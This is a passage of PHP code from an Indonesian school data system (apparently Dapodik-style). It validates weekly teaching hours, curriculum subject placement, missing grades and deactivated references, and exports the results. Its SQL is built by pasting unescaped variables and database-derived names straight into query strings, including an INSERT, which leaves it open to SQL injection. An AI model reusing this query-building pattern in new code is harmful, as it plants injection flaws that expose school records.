                            $keterangan = "Rombel dengan nama <b>".$value['nama_rombel']."</b> tingkat ".$value['tingkat_pendidikan_id']." memiliki Mata Pelajaran yang berganda (<b>".$value['nama_mapel']."</b>) pada kelompok mata pelajaran <b>Matpel Bidang Studi Wajib A / Kelompok A</b>";
                            $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);
                        }
                    }
                }

                $sql = "select
                            rombongan_belajar.tingkat_pendidikan_id,
                            rombongan_belajar.nama,
                            kurikulum.nama_kurikulum,
                            kurikulum.kurikulum_id,
                            (case when kurikulum.nama_kurikulum ilike '%2013%' then 1 else 0 end) as is_k13,
                            (case when kurikulum.nama_kurikulum ilike '%REV%' then 1 else 0 end) as is_k13_rev,
                            jjm_rombel.jjm,
                            rombel_praktik.sum_jjm as jjm_praktik,
                            rombel_praktik.sum_jjm,
                            coalesce(matpel_agama.jjm, 0) as jjm_agama,
                            coalesce(jjm_rombel.jjm, 0) + (
                                case when kurikulum.nama_kurikulum ilike '%2013%' then (
                                    case when matpel_agama.jjm >= 3 then 3 else 0 end
                                ) else (
                                    case when matpel_agama.jjm >= 2 then 2 else 0 end
                                ) end
                            ) + coalesce(rombel_praktik.sum_jjm, 0) as total_jjm,
                            coalesce(jjm_rombel.jjm, 0) + coalesce(matpel_agama.jjm, 0) as total_jjm_real
                        from rombongan_belajar
                        join ref.kurikulum on rombongan_belajar.kurikulum_id = kurikulum.kurikulum_id
                        join (
                            select
                                rombongan_belajar_id,
                                sum(jam_mengajar_per_minggu) jjm
                            from pembelajaran
                            where
                                soft_delete = 0
                                and status_di_kurikulum in (1,2,3,4,5,8)
                                and mata_pelajaran_id not in (select mata_pelajaran_id from ref.mata_pelajaran where nama ilike '%Pendidikan Agama%' and expired_date is null)
                            group by
                                rombongan_belajar_id
                        ) jjm_rombel on rombongan_belajar.rombongan_belajar_id = jjm_rombel.rombongan_belajar_id
                        left join (
                            select
                                pembelajaran.rombongan_belajar_id,
                                sum(pembelajaran.jam_mengajar_per_minggu) jjm
                            from pembelajaran
                            where
                                pembelajaran.mata_pelajaran_id in (select mata_pelajaran_id from ref.mata_pelajaran where nama ilike '%Pendidikan Agama%' and expired_date is null)
                            group by
                                pembelajaran.rombongan_belajar_id
                        ) matpel_agama on rombongan_belajar.rombongan_belajar_id = matpel_agama.rombongan_belajar_id
                        left outer join (
                            select
                                rombongan_belajar.semester_id,
                                rombongan_belajar.sekolah_id,
                                rombongan_belajar.tingkat_pendidikan_id,
                                rombongan_belajar.jurusan_sp_id,
                                rombongan_belajar.kurikulum_id,
                                rombongan_belajar.nama,
                                rombongan_belajar.ptk_id,
                                rombongan_belajar.moving_class,
                                rombongan_belajar.sks,
                                rombongan_belajar.kebutuhan_khusus_id,
                                sum(distinct pembelajaran.jam_mengajar_per_minggu) sum_jjm
                            from pembelajaran
                            join rombongan_belajar on pembelajaran.rombongan_belajar_id = rombongan_belajar.rombongan_belajar_id
                            where
                                pembelajaran.soft_delete = 0
                                and rombongan_belajar.soft_delete = 0
                                and rombongan_belajar.semester_id = '{$sessionSemester}'
                                and rombongan_belajar.sekolah_id = '{$sekolah_id}'
                                and rombongan_belajar.jenis_rombel = 3
                            group by
                                rombongan_belajar.semester_id,
                                rombongan_belajar.sekolah_id,
                                rombongan_belajar.tingkat_pendidikan_id,
                                rombongan_belajar.jurusan_sp_id,
                                rombongan_belajar.kurikulum_id,
                                rombongan_belajar.nama,
                                rombongan_belajar.ptk_id,
                                rombongan_belajar.moving_class,
                                rombongan_belajar.sks,
                                rombongan_belajar.kebutuhan_khusus_id
                        ) rombel_praktik on
                            rombel_praktik.semester_id = rombongan_belajar.semester_id
                            and rombel_praktik.sekolah_id = rombongan_belajar.sekolah_id
                            and rombel_praktik.tingkat_pendidikan_id = rombongan_belajar.tingkat_pendidikan_id
                            and rombel_praktik.jurusan_sp_id = rombongan_belajar.jurusan_sp_id
                            and rombel_praktik.kurikulum_id = rombongan_belajar.kurikulum_id
                            and rombel_praktik.nama = rombongan_belajar.nama
                            and rombel_praktik.ptk_id = rombongan_belajar.ptk_id
                            and rombel_praktik.moving_class = rombongan_belajar.moving_class
                            and rombel_praktik.sks = rombongan_belajar.sks
                            and rombel_praktik.kebutuhan_khusus_id = rombongan_belajar.kebutuhan_khusus_id
                        where
                            rombongan_belajar.jenis_rombel in (1,8,9,10,11,12,13)
                            and rombongan_belajar.soft_delete = 0
                            and rombongan_belajar.semester_id = '{$sessionSemester}'
                            and rombongan_belajar.sekolah_id = '{$sekolah_id}'";
                // echo $sql; die;

                $datas = getDataBySql($sql, FALSE, DBNAME);
                foreach ($datas as $data) {
                    $bentukPendidikan = $sekolahObj->getBentukPendidikanId();
                    if ($app['session']->get('jenjang') == 'DIKMEN'){

                        if ($data['is_k13'] == 1) {

                            if ($data['is_k13_rev']) {
                                if ($bentukPendidikan == 15) {
                                    if ($data['tingkat_pendidikan_id'] == 10 && $data['total_jjm'] > 48) {
                                        if ($data['kurikulum_id'] == 334) {
                                            // 334 - SMK 2013 REV.  Pelayaran Kapal Penangkap Ikan
                                            if ($data['total_jjm'] > 49) {
                                                $keterangan = "Pembelajaran dgn nama rombel <b>".$data['nama']."</b> dan tingkat pendidikan <b>".$data['tingkat_pendidikan_id']."</b> pada kurikulum 2013 REV maksimal JJM/rombel adalah 48jam/minggu (saat ini: ".$data['total_jjm']."jam)";
                                                $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);    
                                            }
                                        } else {
                                            $keterangan = "Pembelajaran dgn nama rombel <b>".$data['nama']."</b> dan tingkat pendidikan <b>".$data['tingkat_pendidikan_id']."</b> pada kurikulum 2013 REV maksimal JJM/rombel adalah 48jam/minggu (saat ini: ".$data['total_jjm']."jam)";
                                            $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);
                                        }
                                    } else if ($data['tingkat_pendidikan_id'] == 11 && $data['total_jjm'] > 50) {
                                        $keterangan = "Pembelajaran dgn nama rombel <b>".$data['nama']."</b> dan tingkat pendidikan <b>".$data['tingkat_pendidikan_id']."</b> pada kurikulum 2013 REV maksimal JJM/rombel adalah 50jam/minggu (saat ini: ".$data['total_jjm']."jam)";
                                        $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);
                                    } else if ($data['tingkat_pendidikan_id'] == 12 && $data['total_jjm'] > 50) {
                                        $keterangan = "Pembelajaran dgn nama rombel <b>".$data['nama']."</b> dan tingkat pendidikan <b>".$data['tingkat_pendidikan_id']."</b> pada kurikulum 2013 REV maksimal JJM/rombel adalah 50jam/minggu (saat ini: ".$data['total_jjm']."jam)";
                                        $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);
                                    } else if ($data['tingkat_pendidikan_id'] == 13 && $data['total_jjm'] > 48) {
                                        $keterangan = "Pembelajaran dgn nama rombel <b>".$data['nama']."</b> dan tingkat pendidikan <b>".$data['tingkat_pendidikan_id']."</b> pada kurikulum 2013 REV maksimal JJM/rombel adalah 48jam/minggu (saat ini: ".$data['total_jjm']."jam)";
                                        $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);
                                    }
                                }
                            } else {
                                if ($bentukPendidikan == 13 && $data['tingkat_pendidikan_id'] == 10 && $data['total_jjm'] > 38) {
                                    $keterangan = "Pembelajaran dgn nama rombel <b>".$data['nama']."</b> dan tingkat pendidikan <b>".$data['tingkat_pendidikan_id']."</b> pada kurikulum 2013 maksimal JJM/rombel adalah 38jam/minggu (saat ini: ".$data['total_jjm']."jam)";
                                    $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);
                                } else if ($bentukPendidikan == 13 && $data['tingkat_pendidikan_id'] > 10 && $data['total_jjm'] > 42) {
                                    $keterangan = "Pembelajaran dgn nama rombel <b>".$data['nama']."</b> dan tingkat pendidikan <b>".$data['tingkat_pendidikan_id']."</b> pada kurikulum 2013 maksimal JJM/rombel adalah 42jam/minggu (saat ini: ".$data['total_jjm']."jam)";
                                    $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);
                                } else if ($bentukPendidikan == 15 && $data['total_jjm'] > 50) {
                                    $keterangan = "Pembelajaran dgn nama rombel <b>".$data['nama']."</b> dan tingkat pendidikan <b>".$data['tingkat_pendidikan_id']."</b> pada kurikulum 2013 maksimal JJM/rombel adalah 50jam/minggu (saat ini: ".$data['total_jjm']."jam)";
                                    $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);
                                }
                            }

                        } else {

                            if ($bentukPendidikan == 13 && $data['tingkat_pendidikan_id'] == 10 && $data['total_jjm'] > 42) {
                                $keterangan = "Pembelajaran dgn nama rombel <b>".$data['nama']."</b> dan tingkat pendidikan <b>".$data['tingkat_pendidikan_id']."</b> pada kurikulum 2006 maksimal JJM/rombel adalah 42jam/minggu (saat ini: ".$data['total_jjm']."jam)";
                                $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);
                            } else if ($bentukPendidikan == 13 && $data['tingkat_pendidikan_id'] > 10 && $data['total_jjm'] > 43) {
                                $keterangan = "Pembelajaran dgn nama rombel <b>".$data['nama']."</b> dan tingkat pendidikan <b>".$data['tingkat_pendidikan_id']."</b> pada kurikulum 2006 maksimal JJM/rombel adalah 43jam/minggu (saat ini: ".$data['total_jjm']."jam)";
                                $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);
                            } else if ($bentukPendidikan == 15 && $data['total_jjm'] > 54) {
                                $keterangan = "Pembelajaran dgn nama rombel <b>".$data['nama']."</b> dan tingkat pendidikan <b>".$data['tingkat_pendidikan_id']."</b> pada kurikulum 2006 maksimal JJM/rombel adalah 54jam/minggu (saat ini: ".$data['total_jjm']."jam)";
                                $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);
                            }

                        }

                    } else if ($app['session']->get('jenjang') == 'DIKDAS') {

                        if ($data['is_k13'] == 1) {

                            if (in_array($data['tingkat_pendidikan_id'], array(1,2,3)) && $data['total_jjm'] > 36) {
                                $keterangan = "Pembelajaran dgn nama rombel <b>".$data['nama']."</b> dan tingkat pendidikan <b>".$data['tingkat_pendidikan_id']."</b> pada kurikulum 2013 maksimal JJM/rombel adalah 36jam/minggu (saat ini: ".$data['total_jjm']."jam)";
                                $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);
                            } else if ($data['tingkat_pendidikan_id'] > 3 && $data['tingkat_pendidikan_id'] < 10 && $data['total_jjm'] > 40) {
                                $keterangan = "Pembelajaran dgn nama rombel <b>".$data['nama']."</b> dan tingkat pendidikan <b>".$data['tingkat_pendidikan_id']."</b> pada kurikulum 2013 maksimal JJM/rombel adalah 40jam/minggu (saat ini: ".$data['total_jjm']."jam)";
                                $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);
                            }

                        } else {

                            if ($data['tingkat_pendidikan_id'] == 1 && $data['total_jjm'] > 30) {
                                $keterangan = "Pembelajaran dgn nama rombel <b>".$data['nama']."</b> dan tingkat pendidikan <b>".$data['tingkat_pendidikan_id']."</b> pada kurikulum 2006 maksimal JJM/rombel adalah 30jam/minggu (saat ini: ".$data['total_jjm']."jam)";
                                $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);
                            } else if ($data['tingkat_pendidikan_id'] == 2 && $data['total_jjm'] > 31) {
                                $keterangan = "Pembelajaran dgn nama rombel <b>".$data['nama']."</b> dan tingkat pendidikan <b>".$data['tingkat_pendidikan_id']."</b> pada kurikulum 2006 maksimal JJM/rombel adalah 31jam/minggu (saat ini: ".$data['total_jjm']."jam)";
                                $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);
                            } else if ($data['tingkat_pendidikan_id'] == 3 && $data['total_jjm'] > 32) {
                                $keterangan = "Pembelajaran dgn nama rombel <b>".$data['nama']."</b> dan tingkat pendidikan <b>".$data['tingkat_pendidikan_id']."</b> pada kurikulum 2006 maksimal JJM/rombel adalah 32jam/minggu (saat ini: ".$data['total_jjm']."jam)";
                                $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);
                            } else if ($data['tingkat_pendidikan_id'] > 3 && $data['tingkat_pendidikan_id'] < 10 && $data['total_jjm'] > 36) {
                                $keterangan = "Pembelajaran dgn nama rombel <b>".$data['nama']."</b> dan tingkat pendidikan <b>".$data['tingkat_pendidikan_id']."</b> pada kurikulum 2006 maksimal JJM/rombel adalah 36jam/minggu (saat ini: ".$data['total_jjm']."jam)";
                                $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);
                            }

                        }

                    }

                }

                $sql = "SELECT
                            rombongan_belajar.rombongan_belajar_id,
                            rombongan_belajar.kurikulum_id,
                            rombongan_belajar.nama,
                            kurikulum.nama_kurikulum,
                            (CASE WHEN kurikulum.nama_kurikulum ILIKE '%2013%' THEN 1 ELSE 0 END) AS is_k13,
                            SUM(pembelajaran.jam_mengajar_per_minggu) AS jjm_matpel_wajib,
                            (CASE WHEN kurikulum.nama_kurikulum ILIKE '%2013%' THEN
                                CASE WHEN SUM(pembelajaran.jam_mengajar_per_minggu) > 2 THEN 0 ELSE 1 END
                            ELSE
                                CASE WHEN SUM(pembelajaran.jam_mengajar_per_minggu) > 4 THEN 0 ELSE 1 END
                            END) AS is_valid
                        FROM pembelajaran
                        JOIN rombongan_belajar ON pembelajaran.rombongan_belajar_id = rombongan_belajar.rombongan_belajar_id
                        JOIN ref.kurikulum ON rombongan_belajar.kurikulum_id = kurikulum.kurikulum_id
                        WHERE
                            pembelajaran.soft_delete = 0
                            AND pembelajaran.status_di_kurikulum = 2
                            AND rombongan_belajar.sekolah_id = '{$sekolah_id}'
                            AND rombongan_belajar.semester_id = '{$sessionSemester}'
                            AND rombongan_belajar.soft_delete = 0
                            AND rombongan_belajar.jenis_rombel in (1,8,9,10,11,12,13)
                        GROUP BY
                            rombongan_belajar.rombongan_belajar_id,
                            rombongan_belajar.kurikulum_id,
                            kurikulum.nama_kurikulum,
                            rombongan_belajar.nama";

                $datas = getDataBySql($sql, FALSE, DBNAME);

                // print_r($datas);
                foreach ($datas as $data) {
                    if ($data['is_valid'] != 1) {

                        if ($data['is_k13']) {
                            $hingga = 2;
                        } else {
                            $hingga = 4;
                        }

                        $keterangan = "Pembelajaran pada rombongan belajar dgn nama <b>".$data['nama']."</b> pada kelompok <b>Matpel Wajib Tambahan</b> terdeteksi jumlah jam/minggu lebih dari <b>{$hingga} jam</b>. (Saat ini berjumlah <b>".$data['jjm_matpel_wajib']." jam</b>)";
                        $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);
                    }
                }


                // cek jika ada matpel diluar kurikulum yg berlaku
                $sql = "select
                            ptk.nama,
                            ptk.nuptk,
                            rombongan_belajar.tingkat_pendidikan_id,
                            rombongan_belajar.nama as rombongan_belajar_id_str,
                            jenis_rombel.nm_jenis_rombel as jenis_rombel,
                            kurikulum.nama_kurikulum,
                            jurusan_sp.nama_jurusan_sp,
                            mata_pelajaran.nama as mata_pelajaran_id_str,
                            pembelajaran.status_di_kurikulum,
                            matpelkur.wajib,
                            (case when matpelkur.mata_pelajaran_id is null then 0 else 1 end) as terdapat_di_struktur,
                            sdk_pembelajaran.ket_stat_di_kurikulum as ket_status_pembelajaran,
                            sdk_matpelkur.ket_stat_di_kurikulum as ket_status_matpelkur
                        from pembelajaran
                        join rombongan_belajar on pembelajaran.rombongan_belajar_id = rombongan_belajar.rombongan_belajar_id
                        join ptk_terdaftar on pembelajaran.ptk_terdaftar_id = ptk_terdaftar.ptk_terdaftar_id
                        join ptk on ptk_terdaftar.ptk_id = ptk.ptk_id
                        left join jurusan_sp on rombongan_belajar.jurusan_sp_id = jurusan_sp.jurusan_sp_id
                        join ref.mata_pelajaran on pembelajaran.mata_pelajaran_id = mata_pelajaran.mata_pelajaran_id
                        join ref.jenis_rombel on rombongan_belajar.jenis_rombel = jenis_rombel.jenis_rombel
                        join ref.kurikulum on rombongan_belajar.kurikulum_id = kurikulum.kurikulum_id
                        left outer join ref.mata_pelajaran_kurikulum matpelkur on
                            rombongan_belajar.tingkat_pendidikan_id = matpelkur.tingkat_pendidikan_id
                            and rombongan_belajar.kurikulum_id = matpelkur.kurikulum_id
                            and mata_pelajaran.mata_pelajaran_id = matpelkur.mata_pelajaran_id
                            and matpelkur.expired_date is null
                        left join ref.status_di_kurikulum sdk_pembelajaran on pembelajaran.status_di_kurikulum = sdk_pembelajaran.status_di_kurikulum
                        left join ref.status_di_kurikulum sdk_matpelkur on matpelkur.wajib = sdk_matpelkur.status_di_kurikulum
                        where
                            pembelajaran.soft_delete = 0
                            and pembelajaran.status_di_kurikulum not in (2,9,10)
                            and rombongan_belajar.soft_delete = 0
                            and rombongan_belajar.semester_id = '{$sessionSemester}'
                            and rombongan_belajar.jenis_rombel in (1,8,9,10,11,12,13)
                            and ptk_terdaftar.jenis_keluar_id is null
                            and ptk_terdaftar.soft_delete = 0
                            and ptk_terdaftar.sekolah_id = rombongan_belajar.sekolah_id
                            and ptk.soft_delete = 0
                            and rombongan_belajar.sekolah_id = '{$sekolah_id}'
                            and (matpelkur.mata_pelajaran_id is null or (pembelajaran.status_di_kurikulum <> matpelkur.wajib and matpelkur.wajib <> 0))";

                // echo $sql; die;
                $datas = getDataBySql($sql, FALSE, DBNAME);

                foreach ($datas as $data) {

                    if ($data['terdapat_di_struktur']) {
                        $keterangan = "Terdapat mata pelajaran <b>".$data['mata_pelajaran_id_str']."</b> yang diajarkan oleh <b>".$data['nama']."</b> pada rombel <b>".$data['rombongan_belajar_id_str']."</b> yang diajarkan tidak sesuai dengan struktur kurikulum yang berlaku. (Pembelajaran: <b>".$data['ket_status_pembelajaran']."</b>, Struktur Kurikulum: <b>".$data['ket_status_matpelkur']."</b>)";
                    } else {
                        $keterangan = "Terdapat mata pelajaran <b>".$data['mata_pelajaran_id_str']."</b> yang diajarkan oleh <b>".$data['nama']."</b> pada rombel <b>".$data['rombongan_belajar_id_str']."</b> yang diajarkan diluar dengan struktur kurikulum yang berlaku. Harap masukan ke kelompok mata pelajaran <b>Tambahan</b>";
                    }
                    $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);
                }

               /* $sql = "SELECT
                            pembelajaran.*
                        FROM pembelajaran
                        JOIN rombongan_belajar ON pembelajaran.rombongan_belajar_id = rombongan_belajar.rombongan_belajar_id
                        JOIN ref.semester ON rombongan_belajar.semester_id = semester.semester_id 
                            AND semester.periode_aktif = 1
                        JOIN ref.mata_pelajaran_kurikulum ON mata_pelajaran_kurikulum.kurikulum_id = rombongan_belajar.kurikulum_id
                            AND mata_pelajaran_kurikulum.tingkat_pendidikan_id = rombongan_belajar.tingkat_pendidikan_id
                            AND pembelajaran.mata_pelajaran_id = mata_pelajaran_kurikulum.mata_pelajaran_id
                            AND mata_pelajaran_kurikulum.expired_date IS NULL
                        JOIN pengguna ON pembelajaran.updater_id = pengguna.pengguna_id
                            AND pengguna.sekolah_id = rombongan_belajar.sekolah_id
                            AND pengguna.soft_delete = 0
                            AND pengguna.aktif = 1
                        WHERE
                            rombongan_belajar.soft_delete = 0
                            AND rombongan_belajar.jenis_rombel IN (1,8,9,10,11,12,13)
                            AND pembelajaran.status_di_kurikulum NOT IN (2,9,10)
                            AND rombongan_belajar.sekolah_id = '7C4771BF-92EA-4B91-8BB9-00002F3F21DE'"*/

            } else if ($jenis_validasi == "nilai") {

                // validasi nilai
                $sql = "select
                            anggota_rombel.anggota_rombel_id,
                            peserta_didik.peserta_didik_id,
                            peserta_didik.nama as nama_pd,
                            peserta_didik.nisn,
                            registrasi_peserta_didik.nipd as nis,
                            rombongan_belajar.tingkat_pendidikan_id,
                            rombongan_belajar.nama as nama_rombel,
                            (case when kurikulum.nama_kurikulum ilike '%2013%' then 1 else 0 end) as is_k13,
                            matev_rapor.a_dari_template,
                            matev_rapor.nm_mata_evaluasi,
                            semester.nama as nama_semester
                        from anggota_rombel
                        join rombongan_belajar on anggota_rombel.rombongan_belajar_id = rombongan_belajar.rombongan_belajar_id
                        join ref.semester on rombongan_belajar.semester_id = semester.semester_id
                        join ref.kurikulum on rombongan_belajar.kurikulum_id = kurikulum.kurikulum_id
                        join peserta_didik on anggota_rombel.peserta_didik_id = peserta_didik.peserta_didik_id
                        join registrasi_peserta_didik on registrasi_peserta_didik.peserta_didik_id = peserta_didik.peserta_didik_id
                        join nilai.matev_rapor on matev_rapor.rombongan_belajar_id = rombongan_belajar.rombongan_belajar_id
                        left outer join nilai.nilai_rapor on
                            matev_rapor.id_evaluasi = nilai_rapor.id_evaluasi
                            and anggota_rombel.anggota_rombel_id = nilai_rapor.anggota_rombel_id
                            and nilai_rapor.soft_delete = 0
                        where
                            anggota_rombel.soft_delete = 0
                            and rombongan_belajar.jenis_rombel in (1,8,9,10,11,12,13)
                            and rombongan_belajar.soft_delete = 0
                            and rombongan_belajar.semester_id = '{$sessionSemester}'
                            and peserta_didik.soft_delete = 0
                            and registrasi_peserta_didik.jenis_keluar_id is null
                            and registrasi_peserta_didik.soft_delete = 0
                            and registrasi_peserta_didik.sekolah_id = rombongan_belajar.sekolah_id
                            and rombongan_belajar.sekolah_id = '{$sekolah_id}'
                            and nilai_rapor.anggota_rombel_id is null
                            and matev_rapor.a_dari_template = 2
                            and matev_rapor.soft_delete = 0
                            and matev_rapor.mata_pelajaran_id not in ('100010000','100011000','100011070','100012000','100012050','100013000','100013010','100014000','100014140','100015000','100015010','100016000','100016010','101001000')
                        order by
                            matev_rapor.a_dari_template,
                            rombongan_belajar.tingkat_pendidikan_id,
                            rombongan_belajar.nama,
                            peserta_didik.nama";

                $rows = getDataBySql($sql, FALSE, DBNAME);

                foreach ($rows as $row) {
                    $keterangan = "Peserta didik a/n <b>".$row['nama_pd']."</b> dgn NIS <b>".$row['nis']."</b> untuk mata evaluasi <b>".$row['nm_mata_evaluasi']."</b> pd rombongan belajar <b>".$row['nama_rombel']." (".$row['nama_semester'].")</b> belum menginputkan nilai US/USBN";
                    $this->setArrValidation($i++, "nilai", 1, $keterangan);
                }

            } else if ($jenis_validasi == "referensi") {

                $sql = "CREATE TABLE IF NOT EXISTS validasi (
                            sekolah_id UUID NOT NULL,
                            no_urut integer,
                            id UUID,
                            jenis_validasi varchar(100) NOT NULL,
                            table_name varchar(100) NOT NULL,
                            tipe integer DEFAULT '1',
                            keterangan VARCHAR(255) DEFAULT '1'
                        )";
                executeSql($sql, DBNAME);

                $sql = "TRUNCATE TABLE validasi";
                executeSql($sql, DBNAME);

                $sql = "SELECT
                            tc.table_schema
                            ,tc.table_name
                            ,kcu.column_name

                            ,ccu.table_schema as ref_table_schema
                            ,ccu.table_name as ref_table_name
                            ,ccu.column_name as ref_column_name
                        FROM information_schema.table_constraints AS tc
                        JOIN information_schema.key_column_usage AS kcu
                            ON tc.constraint_name = kcu.constraint_name
                        JOIN information_schema.constraint_column_usage AS ccu
                            ON ccu.constraint_name = tc.constraint_name
                        JOIN INFORMATION_SCHEMA.REFERENTIAL_CONSTRAINTS fk
                            ON ccu.constraint_name = fk.constraint_name
                        WHERE
                            constraint_type = 'FOREIGN KEY'
                            AND tc.constraint_schema = 'public'
                            AND ccu.table_schema = 'ref'
                            -- AND ccu.table_name not in ('pekerjaan')
                            -- AND tc.table_name = 'peserta_didik'
                            -- AND tc.table_name in ('peserta_didik', 'sekolah', 'ptk', 'rombongan_belajar', 'prasarana')
                            AND tc.table_name in ('sekolah', 'ptk')
                        ";
                // echo $sql; die;
                $rows = getDataBySql($sql, FALSE, DBNAME);

                $no_urut = 1;
                foreach ($rows as $row) {
                    $sql = "SELECT * FROM {$row['ref_table_schema']}.{$row['ref_table_name']} WHERE expired_date IS NOT NULL";
                    $datas = getDataBySql($sql, FALSE, DBNAME);
                    foreach ($datas as $data) {
                        if (!$data[$row['ref_column_name']]) {
                            continue;
                        }

                        if ($row['table_name'] == "peserta_didik") {
                            $sql = "SELECT
                                        rpd.sekolah_id AS sekolah_id
                                        ,pd.peserta_didik_id AS id
                                        ,pd.nama
                                        ,pd.{$row['column_name']}
                                    FROM {$row['table_name']} pd
                                    JOIN registrasi_peserta_didik rpd ON pd.peserta_didik_id = rpd.peserta_didik_id
                                    WHERE
                                        pd.{$row['column_name']}='{$data[$row['ref_column_name']]}'
                                        AND rpd.sekolah_id = '{$sekolah_id}'
                                        AND rpd.jenis_keluar_id IS NULL
                                        AND rpd.soft_delete = 0
                                        AND pd.soft_delete = 0
                                    ";
                        } else if ($row['table_name'] == "ptk") {
                            $sql = "SELECT
                                        ptkd.sekolah_id AS sekolah_id
                                        ,ptk.ptk_id AS id
                                        ,ptk.nama
                                        ,ptk.{$row['column_name']}
                                    FROM {$row['table_name']} ptk
                                    JOIN ptk_terdaftar ptkd ON ptk.ptk_id = ptkd.ptk_id
                                    WHERE
                                        ptk.{$row['column_name']}='{$data[$row['ref_column_name']]}'
                                        AND ptkd.sekolah_id = '{$sekolah_id}'
                                        AND ptkd.jenis_keluar_id IS NULL
                                        AND ptkd.tahun_ajaran_id = '{$tahunAjaranId}'
                                        AND ptkd.soft_delete = 0
                                        AND ptkd.ptk_induk = 1
                                        AND ptk.soft_delete = 0";
                        } else if ($row['table_name'] == "rombongan_belajar") {
                            $sql = "SELECT
                                    '{$sekolah_id}' AS sekolah_id
                                    ,{$row['table_name']}_id AS id
                                    ,nama
                                    ,{$row['column_name']}
                                FROM {$row['table_name']}
                                WHERE
                                    {$row['column_name']}='{$data[$row['ref_column_name']]}'
                                    AND sekolah_id = '{$sekolah_id}'
                                    AND jenis_rombel IN (1,8,9,10,11,12,13)
                                    AND semester_id = '{$sessionSemester}'
                                    AND soft_delete = 0";
                        } else {
                            $sql = "SELECT
                                    '{$sekolah_id}' AS sekolah_id
                                    ,{$row['table_name']}_id AS id
                                    ,nama
                                    ,{$row['column_name']}
                                FROM {$row['table_name']}
                                WHERE
                                    {$row['column_name']}='{$data[$row['ref_column_name']]}'
                                    AND sekolah_id = '{$sekolah_id}'";
                        }
                        // echo $sql; die;
                        $fetch = getDataBySql($sql, FALSE, DBNAME);

                        foreach ($fetch as $fet) {
                            $msg = "Ditemukan <b>".humanize($row['table_name'])."</b> dgn nama <b>".$fet['nama']."</b> pada isian <b>".humanize(str_replace("_id", "", str_replace("id_", "", $row['column_name'])))."</b> menggunakan referensi yang telah dinon-aktifkan oleh pusat. Silakan ganti isian tersebut dengan referensi yang aktif";

                            if (in_array($row['column_name'], array('jenis_ptk_id', 'status_kepegawaian_id'))) {
                                $this->setTriggerValidation($app, "ptk", $fet['id'], $row['column_name'], $msg);
                            }

                            // echo $msg."<br>";
                            $sql = "INSERT INTO validasi (sekolah_id, no_urut, id, jenis_validasi, table_name, tipe, keterangan) VALUES (
                                    '". $sekolah_id ."'
                                    ,{$no_urut}
                                    ,'{$fet['id']}'
                                    ,'referensi'
                                    ,'{$row['table_name']}'
                                    ,2
                                    ,'".$msg."');";
                            // echo $sql; die;
                            executeSql($sql, DBNAME);

                            $no_urut++;
                        }
                    }

                }

            } else {
                return "{ 'success': false, 'message': 'Jenis validasi tidak tersedia' }";
            }

        }

        $arrData = $this->getArrValidation();

        foreach ($arrData as $key => $row) {
            $tipe[$key]  = $row['tipe'];
            $validasi_id[$key] = $row['validasi_id'];
        }

        if ($jenis_validasi != "referensi") {
            array_multisort($tipe, SORT_DESC, $validasi_id, SORT_ASC, $arrData);
        }

        if ($print == 1) {
            ob_start();

            $today = date("Y-m-d H:i:s");
            $sekolahNama = preg_replace("([^\w\s\d\-_~,;:\[\]\(\]]|[\.]{2,})", '', $sekolahObj->getNama());

            switch ($jenis_validasi) {
                case 'sekolah': $ket_validasi = "Sekolah"; break;
                case 'prasarana': $ket_validasi = "Sarpras"; break;
                case 'peserta_didik': $ket_validasi = "Peserta Didik"; break;
                case 'ptk': $ket_validasi = "PTK"; break;
                case 'rombongan_belajar': $ket_validasi = "Rombongan Belajar"; break;
                case 'pembelajaran': $ket_validasi = "Pembelajaran"; break;
                case 'nilai': $ket_validasi = "Nilai"; break;
                default: $ket_validasi = "Unknown"; break;
            }

            // print_r($arrData); die;

            header('Content-type: application/vnd.ms-excel');
            header('Content-Disposition: attachment; filename="Validasi '. $ket_validasi .' '.$sekolahNama.' '.$today.'.xls"');

            $countRow = sizeof($arrData) + 100;
            include (dirname(__FILE__).D.'Templates'.D.'template-validasi.php');

            ob_end_flush();

            return false;
        } else {
            $totalCount = sizeof($arrData);
            // echo "{$totalCount} > {$request->get('limit')}";
            // if ($totalCount > 50) {
                // $arrData = self::get_page($arrData, $request->get('start'), $request->get('limit'));
                // $arrData = self::paginate($arrData, $request->get('limit'), $request->get('page'));
                // $arrData = array_slice($arrData, $request->get('start'), $request->get('limit'));
            // }

            // print_r($arrData); die;
            return tableJson($arrData, $totalCount, array("validasi_id", "table", "tipe", "keterangan"));
        }
    }
}